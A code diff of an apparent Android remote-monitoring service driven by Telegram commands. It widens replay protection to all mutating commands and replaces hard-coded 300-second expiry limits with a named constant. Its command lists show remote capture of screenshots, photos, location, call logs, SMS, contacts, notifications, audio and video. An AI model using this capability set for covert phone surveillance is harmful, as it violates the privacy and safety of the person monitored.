@@ -132,9 +132,10 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val NO_REPLAY_COMMANDS = setOf("/smsconfirm")
+        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/smsconfirm"
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
+        private const val MUTATING_MAX_AGE_SEC = 300L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
@@ -987,7 +988,7 @@ class MonitoringService : Service() {
         val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
         if (pressedAt > 0L) {
             val menuAge = System.currentTimeMillis() / 1000L - pressedAt
-            val menuMaxAge = if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) 300L else 900L
+            val menuMaxAge = if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) MUTATING_MAX_AGE_SEC else COMMAND_MAX_AGE_SEC
             if (menuAge > menuMaxAge) {
                 sendToTelegram("\u231B Menu expired, here is a fresh one.", mainMenu())
                 return
@@ -1142,7 +1143,7 @@ class MonitoringService : Service() {
                 sendToTelegram("\u23F3\uFE0F Command expired, send again.")
             }
             return
-        } else if (sentAtSec > 0 && sentAtSec - nowSec > 300L) {
+        } else if (sentAtSec > 0 && sentAtSec - nowSec > MUTATING_MAX_AGE_SEC) {
             serviceScope.launch {
                 sendToTelegram("\u23F3\uFE0F Command timestamp is in the future. Check the device clock, then send again.")
             }
@@ -1168,7 +1169,7 @@ class MonitoringService : Service() {
     private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "") {
         if (sentAtSec > 0 && (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS)) {
             val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
-            if (ageSec > 300L) {
+            if (ageSec > MUTATING_MAX_AGE_SEC) {
                 sendToTelegram("\u23F3\uFE0F Command $command expired, send again.")
                 return
             }
